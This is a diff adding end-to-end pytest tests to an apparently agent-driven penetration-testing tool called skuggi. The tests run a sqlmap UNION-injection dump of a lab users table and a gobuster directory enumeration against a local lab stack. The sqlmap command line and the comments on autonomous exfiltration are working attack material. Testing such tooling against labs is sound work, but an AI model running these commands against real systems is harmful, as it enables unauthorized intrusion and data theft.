@@ -10,12 +10,15 @@ guard below proves: a shared stack stays order-independent. See
 
 from __future__ import annotations
 
+from collections.abc import Callable
 from pathlib import Path
 
 import pytest
 
+from skuggi.agent.core import AgentCore
 from skuggi.agent.protocol import FindingDraft
-from tests.e2e.conftest import Lab, Runner
+from skuggi.persistence.ledger import CommandRow
+from tests.e2e.conftest import Lab, Runner, require_tool
 
 pytestmark = [
     pytest.mark.e2e,
@@ -121,3 +124,65 @@ def test_multi_finding_report_groups_and_renders_pdf(engage: Runner, lab: Lab) -
     assert pdf_path.suffix == ".pdf"
     assert pdf_path.is_file()
     assert pdf_path.stat().st_size > 0
+
+
+def _executed(rows: list[CommandRow]) -> list[CommandRow]:
+    return [r for r in rows if r.status == "executed"]
+
+
+def test_sqlmap_automates_the_union_injection(engage: Runner, lab: Lab) -> None:
+    """Automated-exploitation tool class: sqlmap dumps the users table by itself.
+
+    Unlike the hand-crafted UNION case, the worker just points sqlmap at the
+    parameter and the tool finds and dumps the injection -- exercising a real
+    second tool through the production guard/registry/executor path. Read-only
+    (SELECT dump), so it shares the stack like the curl scenarios.
+    """
+    require_tool("sqlmap")
+    target = f"{lab.base_url}/post.php?id=1"
+    # Dump the username column, not password: dumping the hash makes --batch
+    # auto-launch a dictionary crack whose per-word progress floods stdout past
+    # skuggi's 256 KB capture cap. Usernames prove the same autonomous exfil
+    # (sqlmap found the injection and read real rows) without the crack spam.
+    rows = engage.run(
+        "sqlmap -u " + target + " --batch --flush-session --technique=U --dbms=mysql"
+        " -p id --dump -T users -C username",
+        timeout_s=120.0,
+    )
+    executed = _executed(rows)
+    assert len(executed) == 1
+    row = executed[0]
+    assert row.exit_code == 0
+    assert "is vulnerable" in row.stdout  # sqlmap confirmed the injection itself
+    assert "admin" in row.stdout  # and exfiltrated a real row from the users table
+
+
+def _seed(relpath: str, text: str) -> Callable[[AgentCore], None]:
+    """A Runner setup hook that writes ``text`` to ``<workspace>/<relpath>``."""
+
+    def _write(core: AgentCore) -> None:
+        assert core.workspace is not None
+        path = core.workspace.root / relpath
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(text, encoding="utf-8")
+
+    return _write
+
+
+def test_gobuster_enumerates_a_known_path(engage: Runner, lab: Lab) -> None:
+    """Enumeration tool class: gobuster finds /backup from a confined wordlist.
+
+    The wordlist is seeded into the workspace and referenced by a workspace-
+    relative path, so it passes the real data-file confinement guard (the tool
+    runs from recon/, the file lives in inputs/). Read-only GETs against the
+    shared stack.
+    """
+    require_tool("gobuster")
+    rows = engage.run(
+        f"gobuster dir -u {lab.base_url} -w ../inputs/words.txt -q -t 5",
+        setup=_seed("inputs/words.txt", "backup\nadmin\nnope\nmissing\n"),
+        timeout_s=120.0,
+    )
+    executed = _executed(rows)
+    assert len(executed) == 1
+    assert "/backup" in executed[0].stdout  # discovered the exposed backup dir
